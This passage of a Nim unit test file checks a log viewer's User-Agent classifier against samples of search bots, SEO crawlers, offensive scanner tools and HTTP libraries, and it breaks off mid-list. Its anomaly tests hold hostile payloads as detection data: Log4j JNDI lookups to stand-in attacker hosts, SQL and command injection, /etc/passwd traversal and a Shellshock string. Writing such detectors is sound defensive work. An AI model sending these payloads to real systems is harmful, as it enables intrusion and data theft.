## Unit tests for User-Agent taxonomy, bot identification, and anomaly detection.
## Tests Phase 04 / Category B (Items 01 through 06).

import std/[unittest, strutils, options]
import http_logviewer/core/types
import http_logviewer/analyzer/useragents

suite "User-Agent Taxonomy - Verified Search Engine Bots (Phase 04 / Category B / Item 01)":
  test "Item 01: Standard Googlebot variants detected as CategoryVerifiedBot":
    let googleUas = [
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Googlebot-Image/1.0",
      "Googlebot-Video/1.0",
      "AdsBot-Google (+http://www.google.com/adsbot.html)",
      "Mozilla/5.0 (compatible; Google-InspectionTool/1.0;)"
    ]
    for ua in googleUas:
      check isSearchEngineBot(ua)
      let bot = detectSearchEngineBot(ua)
      check bot.isSome
      check bot.get().category == CategoryVerifiedBot
      let classification = classifyUserAgent(ua)
      check classification.category == CategoryVerifiedBot
      check classification.suggestedThreatScore == 0
      check classification.flags == {}

  test "Item 01: Bing, DuckDuckGo, Yandex, and Baidu bots identified":
    let engines = [
      ("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", "Bingbot"),
      ("Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)", "DuckDuckBot"),
      ("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", "YandexBot"),
      ("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)", "Baiduspider"),
      ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)", "Applebot"),
      ("Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)", "Sogou Spider"),
      ("Mozilla/5.0 (compatible; Qwantify/Bleriot/1.1; +https://help.qwant.com/bot)", "Qwantify"),
      ("Mozilla/5.0 (compatible; SeznamBot/4.0; +http://napoveda.seznam.cz/en/seznambot-intro/)", "SeznamBot")
    ]
    for (ua, expectedName) in engines:
      check isSearchEngineBot(ua)
      let bot = detectSearchEngineBot(ua)
      check bot.isSome
      check bot.get().name == expectedName
      check bot.get().category == CategoryVerifiedBot

  test "Item 01: Friendly social and archival crawlers":
    let friendly = [
      ("ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)", "Internet Archive"),
      ("Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)", "Internet Archive Bot"),
      ("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", "Facebook External Hit"),
      ("Twitterbot/1.0", "Twitterbot"),
      ("LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)", "LinkedInBot"),
      ("Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)", "Slackbot"),
      ("TelegramBot (like TwitterBot)", "TelegramBot")
    ]
    for (ua, expectedName) in friendly:
      check isFriendlyCrawler(ua)
      let bot = detectFriendlyCrawler(ua)
      check bot.isSome
      check bot.get().name == expectedName
      check bot.get().category == CategoryFriendlyCrawler
      let classification = classifyUserAgent(ua)
      check classification.category == CategoryFriendlyCrawler

suite "User-Agent Taxonomy - Commercial & SEO Crawlers (Phase 04 / Category B / Item 02)":
  test "Item 02: Ahrefs, Semrush, MJ12, and DotBot detected":
    let commercial = [
      ("Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)", "AhrefsBot"),
      ("Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "SemrushBot"),
      ("Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)", "MJ12bot"),
      ("Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)", "DotBot"),
      ("Screaming Frog SEO Spider/19.2", "Screaming Frog SEO Spider"),
      ("Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)", "ByteSpider"),
      ("Mozilla/5.0 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)", "PetalBot"),
      ("CriteoBot/1.0 (+https://www.criteo.com/criteo-crawler/)", "CriteoBot"),
      ("Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com)", "BLEXBot"),
      ("Mozilla/5.0 (compatible; SEOkicks-Robot; +https://www.seokicks.de/robot.html)", "SEOkicks"),
      ("ZoominfoBot (zoominfobot at zoominfo dot com)", "ZoominfoBot"),
      ("Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)", "DataForSeoBot"),
      ("Seekport Bot; http://www.seekport.com/bot", "Seekport Bot"),
      ("SiteAuditBot/0.97 (+http://www.semrush.com/bot.html)", "SiteAuditBot"),
      ("MegaIndex.ru/2.0 (https://megaindex.com/crawler)", "MegaIndex"),
      ("Mozilla/5.0 (compatible; SerpstatBot/2.1; +http://serpstatbot.com/)", "SerpstatBot"),
      ("CCBot/2.0 (https://commoncrawl.org/faq/)", "Common Crawl Bot"),
      ("Mozilla/5.0 (compatible; MojeekBot/0.11; +https://www.mojeek.com/bot.html)", "MojeekBot"),
      ("TurnitinBot/3.0 (http://www.turnitin.com/robot/crawlerinfo.html)", "TurnitinBot")
    ]
    for (ua, expectedName) in commercial:
      check isCommercialCrawler(ua)
      let bot = detectCommercialCrawler(ua)
      check bot.isSome
      check bot.get().name == expectedName
      check bot.get().category == CategoryCommercialBot
      let classification = classifyUserAgent(ua)
      check classification.category == CategoryCommercialBot
      check classification.suggestedThreatScore in 0..10

suite "User-Agent Taxonomy - Offensive Scanners & Exploit Tools (Phase 04 / Category B / Item 03)":
  test "Item 03: Detection of standard offensive vulnerability scanners":
    let offensive = [
      ("sqlmap/1.7.2#stable (https://sqlmap.org)", "sqlmap"),
      ("Mozilla/5.0 (compatible; Nikto/2.1.6;)", "nikto"),
      ("masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)", "masscan"),
      ("Mozilla/5.0 (compatible; zgrab/0.x)", "zgrab"),
      ("nuclei - Open-source project (github.com/projectdiscovery/nuclei)", "nuclei"),
      ("gobuster/3.6", "gobuster"),
      ("DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)", "dirbuster"),
      ("Nmap Scripting Engine (https://nmap.org/book/nse.html)", "nmap"),
      ("WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)", "wpscan"),
      ("Havij", "havij"),
      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Acunetix Web Vulnerability Scanner", "acunetix"),
      ("Nessus SOAP Client", "nessus"),
      ("Qualys Vulnerability Scanner", "qualys"),
      ("OpenVAS / Greenbone Vulnerability Management", "openvas"),
      ("Arachni/v1.5.1", "arachni"),
      ("Hydra v9.2", "hydra"),
      ("Medusa v2.2", "medusa"),
      ("Fuzz Faster U Fool v2.0.0 (ffuf)", "ffuf"),
      ("Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686; dirb 2.22)", "dirb"),
      ("WhatWeb/0.5.5", "whatweb"),
      ("Metasploit HTTP Client", "metasploit"),
      ("commix/v3.7-stable (https://commixproject.com)", "commix"),
      ("jaeles/0.17", "jaeles"),
      ("Wfuzz/3.1.0", "wfuzz"),
      ("Sublist3r", "sublist3r"),
      ("Amass/3.19.2", "amass"),
      ("CensysInspect/1.1 (+https://about.censys.io/)", "censysinspect"),
      ("Shodan (https://www.shodan.io)", "shodan")
    ]
    for (ua, expectedScanner) in offensive:
      check isOffensiveScanner(ua)
      let scanner = detectOffensiveScanner(ua)
      check scanner.isSome
      check scanner.get() == expectedScanner
      let classification = classifyUserAgent(ua)
      check classification.category == CategoryBadActorHacker
      check ThreatKnownScannerUa in classification.flags
      check classification.suggestedThreatScore >= 70

suite "User-Agent Taxonomy - Generic HTTP Libraries (Phase 04 / Category B / Item 04)":
  test "Item 04: Detection of programming language HTTP clients":
    let libraries = [
      ("curl/7.88.1", "curl/"),
      ("curl/8.4.0", "curl/"),
      ("python-requests/2.31.0", "python-requests"),
      ("Python-urllib/3.10", "python-urllib"),
      ("urllib/2.0", "urllib/"),
      ("Go-http-client/1.1", "go-http-client"),
      ("Go-http-client/2.0", "go-http-client"),
      ("Wget/1.21.3 (linux-gnu)", "wget/"),
      ("aiohttp/3.8.5", "aiohttp"),
      ("HTTPX/0.24.1", "httpx/"),
      ("libwww-perl/6.52", "libwww-perl"),
      ("PHP/8.2.0 (cli)", "php/"),
      ("PostmanRuntime/7.32.3", "postmanruntime"),
      ("Apache-HttpClient/4.5.13 (Java/11.0.15)", "apache-httpclient"),
      ("okhttp/4.9.3", "okhttp"),
      ("Java/17.0.2", "java/"),
      ("axios/1.4.0", "axios/"),
      ("node-fetch/2.6.7 (+https://github.com/node-fetch/node-fetch)", "node-fetch"),
      ("got (https://github.com/sindresorhus/got)", "got"),
      ("GuzzleHttp/7", "guzzlehttp"),
      ("Faraday v1.10.0", "faraday"),
      ("ruby 3.0.2p107", "ruby")
    ]
    for (ua, expectedLib) in libraries:
      check isGenericHttpLibrary(ua)
      let lib = detectGenericHttpLibrary(ua)
      check lib.isSome
      check lib.get() == expectedLib
      let classification = classifyUserAgent(ua)
      check classification.category == CategorySuspicious
      check classification.suggestedThreatScore >= 15

suite "User-Agent Taxonomy - Anomaly Detection (Phase 04 / Category B / Item 05)":
  test "Item 05: Empty, whitespace, and dash User-Agents flagged":
    let empties = ["", "   ", "\t", "-"]
    for ua in empties:
      let anomalies = detectUserAgentAnomalies(ua)
      check AnomalyEmpty in anomalies
      let classification = classifyUserAgent(ua)
      check classification.category == CategorySuspicious
      check ThreatMalformedRequest in classification.flags

  test "Item 05: Single-word User-Agents flagged as AnomalySingleWord":
    let singleWords = ["Mozilla", "scanner", "test", "bot", "admin", "custom", "spider", "exploit"]
    for ua in singleWords:
      let anomalies = detectUserAgentAnomalies(ua)
      check AnomalySingleWord in anomalies

  test "Item 05: Fake Chrome on Ancient Windows NT 5.x / 4.0 / 98":
    let fakeChromes = [
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.2; Win64; x64) Chrome/114.0.5735.199 Safari/537.36",
      "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36",
      "Mozilla/5.0 (Windows 98) AppleWebKit/537.36 Chrome/75.0.3770.100 Safari/537.36"
    ]
    for ua in fakeChromes:
      let anomalies = detectUserAgentAnomalies(ua)
      check AnomalyFakeChromeOnAncientWindows in anomalies
      let classification = classifyUserAgent(ua)
      check classification.category == CategoryBadActorHacker
      check ThreatKnownScannerUa in classification.flags
      check classification.suggestedThreatScore >= 70

  test "Item 05: Valid Chrome on Windows 10 and Chrome 49 on Windows XP NOT flagged":
    let validModernChrome = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    check AnomalyFakeChromeOnAncientWindows notin detectUserAgentAnomalies(validModernChrome)

    # Historical Chrome 49 (last supported version on XP) should not trigger modern Chrome anomaly
    let validLegacyChrome = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
    check AnomalyFakeChromeOnAncientWindows notin detectUserAgentAnomalies(validLegacyChrome)

  test "Item 05: Hostile exploit payloads inside User-Agent":
    let payloads = [
      "${jndi:ldap://evil.com/a}",
      "Mozilla/5.0 ' union select 1,2,3--",
      "Mozilla/5.0 (compatible; test) ;id",
      "../../../../etc/passwd",
      "() { :;}; /bin/bash -c 'whoami'"
    ]
    for ua in payloads:
      let anomalies = detectUserAgentAnomalies(ua)
      check AnomalyExploitPayloadInUa in anomalies
      let classification = classifyUserAgent(ua)
      check classification.category == CategoryBadActorHacker
      check classification.suggestedThreatScore >= 80

suite "User-Agent Taxonomy - Comprehensive 100+ Sample UA Library (Phase 04 / Category B / Item 06)":
  test "Item 06: Verification of 100+ real-world User-Agent strings":
    type SampleUa = object
      ua: string
      expectedCategory: ActorCategory
      description: string

    let samples: seq[SampleUa] = @[
      # --- 1. Verified Search Engine Bots (18) ---
      SampleUa(ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", expectedCategory: CategoryVerifiedBot, description: "Googlebot Desktop"),
      SampleUa(ua: "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", expectedCategory: CategoryVerifiedBot, description: "Googlebot Mobile"),
      SampleUa(ua: "Googlebot-Image/1.0", expectedCategory: CategoryVerifiedBot, description: "Googlebot Image"),
      SampleUa(ua: "Googlebot-News", expectedCategory: CategoryVerifiedBot, description: "Googlebot News"),
      SampleUa(ua: "Googlebot-Video/1.0", expectedCategory: CategoryVerifiedBot, description: "Googlebot Video"),
      SampleUa(ua: "AdsBot-Google (+http://www.google.com/adsbot.html)", expectedCategory: CategoryVerifiedBot, description: "AdsBot Google"),
      SampleUa(ua: "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X)", expectedCategory: CategoryVerifiedBot, description: "AdsBot Google Mobile"),
      SampleUa(ua: "Mozilla/5.0 (compatible; Google-InspectionTool/1.0;)", expectedCategory: CategoryVerifiedBot, description: "Google Inspection Tool"),
      SampleUa(ua: "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", expectedCategory: CategoryVerifiedBot, description: "Bingbot Desktop"),
      SampleUa(ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", expectedCategory: CategoryVerifiedBot, description: "Bingbot Mobile"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b", expectedCategory: CategoryVerifiedBot, description: "BingPreview"),
      SampleUa(ua: "msnbot/2.0b (+http://search.msn.com/msnbot.htm)", expectedCategory: CategoryVerifiedBot, description: "MSNBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)", expectedCategory: CategoryVerifiedBot, description: "DuckDuckBot"),
      SampleUa(ua: "DuckDuckGo-Favicons-Bot/1.0 (+https://duckduckgo.com)", expectedCategory: CategoryVerifiedBot, description: "DuckDuckGo Favicons"),
      SampleUa(ua: "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", expectedCategory: CategoryVerifiedBot, description: "YandexBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)", expectedCategory: CategoryVerifiedBot, description: "YandexImages"),
      SampleUa(ua: "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)", expectedCategory: CategoryVerifiedBot, description: "Baiduspider"),
      SampleUa(ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)", expectedCategory: CategoryVerifiedBot, description: "Applebot"),

      # --- 2. Friendly Crawlers & Social Previewers (8) ---
      SampleUa(ua: "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)", expectedCategory: CategoryFriendlyCrawler, description: "Alexa Archiver"),
      SampleUa(ua: "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)", expectedCategory: CategoryFriendlyCrawler, description: "Archive.org Bot"),
      SampleUa(ua: "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", expectedCategory: CategoryFriendlyCrawler, description: "Facebook External Hit"),
      SampleUa(ua: "Mozilla/5.0 (compatible; meta-externalagent/1.1; +https://developers.facebook.com/docs/sharing/webmasters/crawler)", expectedCategory: CategoryFriendlyCrawler, description: "Meta External Agent"),
      SampleUa(ua: "Twitterbot/1.0", expectedCategory: CategoryFriendlyCrawler, description: "Twitterbot"),
      SampleUa(ua: "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)", expectedCategory: CategoryFriendlyCrawler, description: "LinkedInBot"),
      SampleUa(ua: "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)", expectedCategory: CategoryFriendlyCrawler, description: "Slackbot"),
      SampleUa(ua: "TelegramBot (like TwitterBot)", expectedCategory: CategoryFriendlyCrawler, description: "TelegramBot"),

      # --- 3. Commercial & SEO Crawlers (20) ---
      SampleUa(ua: "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)", expectedCategory: CategoryCommercialBot, description: "AhrefsBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", expectedCategory: CategoryCommercialBot, description: "SemrushBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)", expectedCategory: CategoryCommercialBot, description: "MJ12bot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)", expectedCategory: CategoryCommercialBot, description: "DotBot"),
      SampleUa(ua: "Screaming Frog SEO Spider/19.2", expectedCategory: CategoryCommercialBot, description: "Screaming Frog Spider"),
      SampleUa(ua: "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)", expectedCategory: CategoryCommercialBot, description: "ByteSpider"),
      SampleUa(ua: "Mozilla/5.0 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)", expectedCategory: CategoryCommercialBot, description: "PetalBot"),
      SampleUa(ua: "CriteoBot/1.0 (+https://www.criteo.com/criteo-crawler/)", expectedCategory: CategoryCommercialBot, description: "CriteoBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com)", expectedCategory: CategoryCommercialBot, description: "BLEXBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; SEOkicks-Robot; +https://www.seokicks.de/robot.html)", expectedCategory: CategoryCommercialBot, description: "SEOkicks"),
      SampleUa(ua: "ZoominfoBot (zoominfobot at zoominfo dot com)", expectedCategory: CategoryCommercialBot, description: "ZoominfoBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)", expectedCategory: CategoryCommercialBot, description: "DataForSeoBot"),
      SampleUa(ua: "Seekport Bot; http://www.seekport.com/bot", expectedCategory: CategoryCommercialBot, description: "Seekport Bot"),
      SampleUa(ua: "SiteAuditBot/0.97 (+http://www.semrush.com/bot.html)", expectedCategory: CategoryCommercialBot, description: "SiteAuditBot"),
      SampleUa(ua: "MegaIndex.ru/2.0 (https://megaindex.com/crawler)", expectedCategory: CategoryCommercialBot, description: "MegaIndex"),
      SampleUa(ua: "Mozilla/5.0 (compatible; SerpstatBot/2.1; +http://serpstatbot.com/)", expectedCategory: CategoryCommercialBot, description: "SerpstatBot"),
      SampleUa(ua: "CCBot/2.0 (https://commoncrawl.org/faq/)", expectedCategory: CategoryCommercialBot, description: "Common Crawl CCBot"),
      SampleUa(ua: "Mozilla/5.0 (compatible; MojeekBot/0.11; +https://www.mojeek.com/bot.html)", expectedCategory: CategoryCommercialBot, description: "MojeekBot"),
      SampleUa(ua: "TurnitinBot/3.0 (http://www.turnitin.com/robot/crawlerinfo.html)", expectedCategory: CategoryCommercialBot, description: "TurnitinBot"),
      SampleUa(ua: "Sogou spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)", expectedCategory: CategoryVerifiedBot, description: "Sogou Spider"),

      # --- 4. Offensive Scanners & Attack Tools (30) ---
      SampleUa(ua: "sqlmap/1.7.2#stable (https://sqlmap.org)", expectedCategory: CategoryBadActorHacker, description: "sqlmap"),
      SampleUa(ua: "Mozilla/5.0 (compatible; Nikto/2.1.6;)", expectedCategory: CategoryBadActorHacker, description: "Nikto"),
      SampleUa(ua: "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)", expectedCategory: CategoryBadActorHacker, description: "masscan"),
      SampleUa(ua: "Mozilla/5.0 (compatible; zgrab/0.x)", expectedCategory: CategoryBadActorHacker, description: "zgrab"),
      SampleUa(ua: "nuclei - Open-source project (github.com/projectdiscovery/nuclei)", expectedCategory: CategoryBadActorHacker, description: "nuclei"),
      SampleUa(ua: "gobuster/3.6", expectedCategory: CategoryBadActorHacker, description: "gobuster"),
      SampleUa(ua: "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)", expectedCategory: CategoryBadActorHacker, description: "DirBuster"),
      SampleUa(ua: "Nmap Scripting Engine (https://nmap.org/book/nse.html)", expectedCategory: CategoryBadActorHacker, description: "nmap NSE"),
      SampleUa(ua: "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)", expectedCategory: CategoryBadActorHacker, description: "WPScan"),
      SampleUa(ua: "Havij 1.17 Pro", expectedCategory: CategoryBadActorHacker, description: "Havij"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Acunetix Web Vulnerability Scanner", expectedCategory: CategoryBadActorHacker, description: "Acunetix"),
      SampleUa(ua: "Nessus SOAP Client", expectedCategory: CategoryBadActorHacker, description: "Nessus"),
      SampleUa(ua: "Qualys Vulnerability Scanner", expectedCategory: CategoryBadActorHacker, description: "Qualys"),
      SampleUa(ua: "OpenVAS / Greenbone Vulnerability Management", expectedCategory: CategoryBadActorHacker, description: "OpenVAS"),
      SampleUa(ua: "Arachni/v1.5.1", expectedCategory: CategoryBadActorHacker, description: "Arachni"),
      SampleUa(ua: "Hydra v9.2", expectedCategory: CategoryBadActorHacker, description: "Hydra"),
      SampleUa(ua: "Medusa v2.2", expectedCategory: CategoryBadActorHacker, description: "Medusa"),
      SampleUa(ua: "Fuzz Faster U Fool v2.0.0 (ffuf)", expectedCategory: CategoryBadActorHacker, description: "ffuf"),
      SampleUa(ua: "Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686; dirb 2.22)", expectedCategory: CategoryBadActorHacker, description: "dirb"),
      SampleUa(ua: "WhatWeb/0.5.5", expectedCategory: CategoryBadActorHacker, description: "WhatWeb"),
      SampleUa(ua: "Metasploit HTTP Client", expectedCategory: CategoryBadActorHacker, description: "Metasploit"),
      SampleUa(ua: "commix/v3.7-stable (https://commixproject.com)", expectedCategory: CategoryBadActorHacker, description: "commix"),
      SampleUa(ua: "jaeles/0.17", expectedCategory: CategoryBadActorHacker, description: "jaeles"),
      SampleUa(ua: "Wfuzz/3.1.0", expectedCategory: CategoryBadActorHacker, description: "Wfuzz"),
      SampleUa(ua: "Sublist3r", expectedCategory: CategoryBadActorHacker, description: "Sublist3r"),
      SampleUa(ua: "Amass/3.19.2", expectedCategory: CategoryBadActorHacker, description: "Amass"),
      SampleUa(ua: "CensysInspect/1.1 (+https://about.censys.io/)", expectedCategory: CategoryBadActorHacker, description: "CensysInspect"),
      SampleUa(ua: "Shodan (https://www.shodan.io)", expectedCategory: CategoryBadActorHacker, description: "Shodan"),
      SampleUa(ua: "projectdiscovery-httpx", expectedCategory: CategoryBadActorHacker, description: "ProjectDiscovery HTTPX"),
      SampleUa(ua: "sqlmap/1.5#dev", expectedCategory: CategoryBadActorHacker, description: "sqlmap dev"),

      # --- 5. Generic HTTP Libraries & Scripting Clients (20) ---
      SampleUa(ua: "curl/7.81.0", expectedCategory: CategorySuspicious, description: "curl 7.81"),
      SampleUa(ua: "curl/8.1.2", expectedCategory: CategorySuspicious, description: "curl 8.1"),
      SampleUa(ua: "python-requests/2.28.1", expectedCategory: CategorySuspicious, description: "python-requests 2.28"),
      SampleUa(ua: "python-requests/2.31.0", expectedCategory: CategorySuspicious, description: "python-requests 2.31"),
      SampleUa(ua: "Python-urllib/3.8", expectedCategory: CategorySuspicious, description: "Python urllib 3.8"),
      SampleUa(ua: "Python-urllib/3.11", expectedCategory: CategorySuspicious, description: "Python urllib 3.11"),
      SampleUa(ua: "Go-http-client/1.1", expectedCategory: CategorySuspicious, description: "Go http client 1.1"),
      SampleUa(ua: "Go-http-client/2.0", expectedCategory: CategorySuspicious, description: "Go http client 2.0"),
      SampleUa(ua: "Wget/1.20.3 (linux-gnu)", expectedCategory: CategorySuspicious, description: "Wget 1.20"),
      SampleUa(ua: "Wget/1.21.4 (linux-gnu)", expectedCategory: CategorySuspicious, description: "Wget 1.21"),
      SampleUa(ua: "aiohttp/3.8.1", expectedCategory: CategorySuspicious, description: "aiohttp 3.8"),
      SampleUa(ua: "HTTPX/0.23.0", expectedCategory: CategorySuspicious, description: "python httpx"),
      SampleUa(ua: "libwww-perl/6.31", expectedCategory: CategorySuspicious, description: "libwww-perl"),
      SampleUa(ua: "PHP/8.1.2", expectedCategory: CategorySuspicious, description: "PHP CLI"),
      SampleUa(ua: "PostmanRuntime/7.29.0", expectedCategory: CategorySuspicious, description: "PostmanRuntime"),
      SampleUa(ua: "Apache-HttpClient/4.5.13 (Java/11.0.12)", expectedCategory: CategorySuspicious, description: "Apache HttpClient"),
      SampleUa(ua: "okhttp/4.9.1", expectedCategory: CategorySuspicious, description: "okhttp"),
      SampleUa(ua: "Java/1.8.0_292", expectedCategory: CategorySuspicious, description: "Java runtime"),
      SampleUa(ua: "axios/0.27.2", expectedCategory: CategorySuspicious, description: "axios 0.27"),
      SampleUa(ua: "node-fetch/2.6.1", expectedCategory: CategorySuspicious, description: "node-fetch"),

      # --- 6. Anomalous, Forged, and Hostile Payload UAs (15) ---
      SampleUa(ua: "", expectedCategory: CategorySuspicious, description: "Empty UA"),
      SampleUa(ua: "-", expectedCategory: CategorySuspicious, description: "Dash UA"),
      SampleUa(ua: "   ", expectedCategory: CategorySuspicious, description: "Whitespace UA"),
      SampleUa(ua: "Mozilla", expectedCategory: CategorySuspicious, description: "Single-word Mozilla"),
      SampleUa(ua: "scanner", expectedCategory: CategorySuspicious, description: "Single-word scanner"),
      SampleUa(ua: "test", expectedCategory: CategorySuspicious, description: "Single-word test"),
      SampleUa(ua: "bot", expectedCategory: CategorySuspicious, description: "Single-word bot"),
      SampleUa(ua: "Mozilla/5.0", expectedCategory: CategorySuspicious, description: "Bare Mozilla 5.0"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", expectedCategory: CategoryBadActorHacker, description: "Fake Chrome 120 on Windows XP"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", expectedCategory: CategoryBadActorHacker, description: "Fake Chrome 99 on Windows 2000"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 5.2; Win64; x64) Chrome/115.0.0.0 Safari/537.36", expectedCategory: CategoryBadActorHacker, description: "Fake Chrome 115 on Windows 2003"),
      SampleUa(ua: "${jndi:ldap://attacker.com/exploit}", expectedCategory: CategoryBadActorHacker, description: "Log4j JNDI in UA"),
      SampleUa(ua: "Mozilla/5.0 ' union select 1,2,3--", expectedCategory: CategoryBadActorHacker, description: "SQLi in UA"),
      SampleUa(ua: ";id; whoami", expectedCategory: CategoryBadActorHacker, description: "Command injection in UA"),
      SampleUa(ua: "../../../../etc/passwd", expectedCategory: CategoryBadActorHacker, description: "Directory traversal in UA"),

      # --- 7. Genuine Real User Human Browsers (25) ---
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", expectedCategory: CategoryRealUser, description: "Chrome on Windows 10/11"),
      SampleUa(ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", expectedCategory: CategoryRealUser, description: "Chrome on macOS"),
      SampleUa(ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", expectedCategory: CategoryRealUser, description: "Chrome on Linux"),
      SampleUa(ua: "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36", expectedCategory: CategoryRealUser, description: "Chrome Mobile Android"),
      SampleUa(ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15", expectedCategory: CategoryRealUser, description: "Safari on macOS Sonoma"),
      SampleUa(ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1", expectedCategory: CategoryRealUser, description: "Safari on iPhone"),
